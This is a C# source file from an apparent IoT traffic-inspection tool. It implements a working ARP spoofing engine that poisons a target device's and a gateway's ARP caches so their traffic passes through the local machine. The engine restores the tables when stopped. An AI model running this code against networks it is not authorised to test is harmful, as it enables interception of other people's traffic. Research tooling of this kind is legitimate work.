using System.Net;
using System.Net.NetworkInformation;
using Microsoft.Extensions.Logging;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace IoTSpy.Proxy.Interception;

/// <summary>
/// ARP spoofing engine that poisons the ARP cache of a target IoT device so that
/// its traffic destined for the default gateway is routed through this machine.
/// Requires root/CAP_NET_RAW and a local pcap library (libpcap / npcap).
/// </summary>
public sealed class ArpSpoofEngine(ILogger<ArpSpoofEngine> logger)
{
    private CancellationTokenSource? _cts;
    private Task? _spoofTask;
    private ILiveDevice? _device;

    public bool IsRunning => _spoofTask is not null && !_spoofTask.IsCompleted;

    /// <summary>
    /// Starts continuous ARP spoofing against the target device.
    /// The target will believe this machine is the gateway, and the gateway
    /// will believe this machine is the target.
    /// </summary>
    /// <param name="targetIp">IP address of the IoT device to intercept.</param>
    /// <param name="gatewayIp">IP address of the real gateway/router.</param>
    /// <param name="networkInterface">Network interface name (e.g., "eth0"). If empty, auto-detect.</param>
    /// <param name="ct">Cancellation token.</param>
    public Task StartAsync(string targetIp, string gatewayIp, string networkInterface, CancellationToken ct = default)
    {
        if (IsRunning) return Task.CompletedTask;
        if (string.IsNullOrWhiteSpace(targetIp) || string.IsNullOrWhiteSpace(gatewayIp))
        {
            logger.LogWarning("ArpSpoof requires TargetDeviceIp and GatewayIp to be configured");
            return Task.CompletedTask;
        }

        _cts = CancellationTokenSource.CreateLinkedTokenSource(ct);

        try
        {
            _device = FindDevice(networkInterface);
            if (_device is null)
            {
                logger.LogError("No suitable network interface found for ARP spoofing");
                return Task.CompletedTask;
            }

            _device.Open(DeviceModes.Promiscuous);

            var targetIpAddr = IPAddress.Parse(targetIp);
            var gatewayIpAddr = IPAddress.Parse(gatewayIp);
            var localMac = _device.MacAddress;

            if (localMac is null)
            {
                logger.LogError("Could not determine MAC address for interface {Interface}", _device.Name);
                _device.Close();
                _device = null;
                return Task.CompletedTask;
            }

            logger.LogInformation(
                "ARP spoofing started: target={Target} gateway={Gateway} iface={Interface} localMac={Mac}",
                targetIp, gatewayIp, _device.Name, localMac);

            _spoofTask = SpoofLoopAsync(targetIpAddr, gatewayIpAddr, localMac, _cts.Token);
        }
        catch (Exception ex)
        {
            logger.LogError(ex, "Failed to start ARP spoofing");
            _device?.Close();
            _device = null;
        }

        return Task.CompletedTask;
    }

    public async Task StopAsync()
    {
        if (!IsRunning) return;

        _cts?.Cancel();
        if (_spoofTask is not null)
        {
            try { await _spoofTask; } catch (OperationCanceledException) { }
        }

        _device?.Close();
        _device = null;
        _spoofTask = null;
        logger.LogInformation("ARP spoofing stopped");
    }

    // ── Spoof loop ───────────────────────────────────────────────────────────

    private async Task SpoofLoopAsync(
        IPAddress targetIp, IPAddress gatewayIp,
        PhysicalAddress localMac, CancellationToken ct)
    {
        // Resolve target and gateway MAC addresses
        var targetMac = await ResolveArpAsync(targetIp, localMac, ct);
        var gatewayMac = await ResolveArpAsync(gatewayIp, localMac, ct);

        if (targetMac is null || gatewayMac is null)
        {
            logger.LogError("Could not resolve MAC addresses. Target={TargetMac} Gateway={GatewayMac}",
                targetMac, gatewayMac);
            return;
        }

        logger.LogInformation("Resolved MACs — Target: {TargetMac}, Gateway: {GatewayMac}", targetMac, gatewayMac);

        // Continuously send ARP replies every 2 seconds
        while (!ct.IsCancellationRequested)
        {
            // Tell target: "gateway IP is at our MAC"
            SendArpReply(localMac, gatewayIp, targetMac, targetIp);

            // Tell gateway: "target IP is at our MAC"
            SendArpReply(localMac, targetIp, gatewayMac, gatewayIp);

            try { await Task.Delay(2000, ct); }
            catch (OperationCanceledException) { break; }
        }

        // Restore real ARP entries before stopping
        SendArpReply(gatewayMac, gatewayIp, targetMac, targetIp);
        SendArpReply(targetMac, targetIp, gatewayMac, gatewayIp);
        logger.LogInformation("ARP tables restored");
    }

    private void SendArpReply(
        PhysicalAddress senderMac, IPAddress senderIp,
        PhysicalAddress targetMac, IPAddress targetIp)
    {
        if (_device is null) return;

        try
        {
            var arpPacket = new ArpPacket(ArpOperation.Response, targetMac, targetIp, senderMac, senderIp);
            var ethernetPacket = new EthernetPacket(senderMac, targetMac, EthernetType.Arp)
            {
                PayloadPacket = arpPacket
            };

            _device.SendPacket(ethernetPacket);
        }
        catch (Exception ex)
        {
            logger.LogDebug(ex, "Failed to send ARP reply");
        }
    }

    // ── ARP resolution ───────────────────────────────────────────────────────

    private async Task<PhysicalAddress?> ResolveArpAsync(
        IPAddress targetIp, PhysicalAddress localMac, CancellationToken ct)
    {
        if (_device is null) return null;

        var broadcastMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF");
        var localIp = GetDeviceIpAddress();
        if (localIp is null) return null;

        // Send ARP request
        var arpRequest = new ArpPacket(ArpOperation.Request, broadcastMac, targetIp, localMac, localIp);
        var ethPacket = new EthernetPacket(localMac, broadcastMac, EthernetType.Arp)
        {
            PayloadPacket = arpRequest
        };

        _device.SendPacket(ethPacket);

        // Wait for ARP reply (timeout after 5 seconds)
        var deadline = DateTime.UtcNow.AddSeconds(5);
        while (DateTime.UtcNow < deadline && !ct.IsCancellationRequested)
        {
            var status = _device.GetNextPacket(out var capture);
            if (status != GetPacketStatus.PacketRead || capture.Data.Length == 0)
            {
                await Task.Delay(10, ct);
                continue;
            }

            var rawPacket = capture.GetPacket();
            var packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);
            var arpReply = packet.Extract<ArpPacket>();
            if (arpReply is not null &&
                arpReply.Operation == ArpOperation.Response &&
                arpReply.SenderProtocolAddress.Equals(targetIp))
            {
                return arpReply.SenderHardwareAddress;
            }
        }

        logger.LogWarning("ARP resolution timed out for {Ip}", targetIp);
        return null;
    }

    // ── Device helpers ───────────────────────────────────────────────────────

    private ILiveDevice? FindDevice(string networkInterface)
    {
        var devices = CaptureDeviceList.Instance;
        if (devices.Count == 0)
        {
            logger.LogError("No capture devices found. Is libpcap installed?");
            return null;
        }

        // If a specific interface is requested, find it
        if (!string.IsNullOrWhiteSpace(networkInterface))
        {
            var match = devices.FirstOrDefault(d =>
                d.Name.Equals(networkInterface, StringComparison.OrdinalIgnoreCase) ||
                d.Description?.Contains(networkInterface, StringComparison.OrdinalIgnoreCase) == true);
            if (match is not null) return match;
            logger.LogWarning("Interface '{Interface}' not found, falling back to auto-detect", networkInterface);
        }

        // Auto-detect: pick the first non-loopback device with an IP address
        foreach (var dev in devices)
        {
            if (dev is LibPcapLiveDevice libDev)
            {
                var addrs = libDev.Addresses;
                var hasIp = addrs.Any(a =>
                    a.Addr?.ipAddress is not null &&
                    !IPAddress.IsLoopback(a.Addr.ipAddress));
                if (hasIp) return dev;
            }
        }

        // Fallback to first device
        return devices.FirstOrDefault();
    }

    private IPAddress? GetDeviceIpAddress()
    {
        if (_device is LibPcapLiveDevice libDev)
        {
            var addr = libDev.Addresses.FirstOrDefault(a =>
                a.Addr?.ipAddress is not null &&
                a.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
            return addr?.Addr?.ipAddress;
        }
        return null;
    }
}
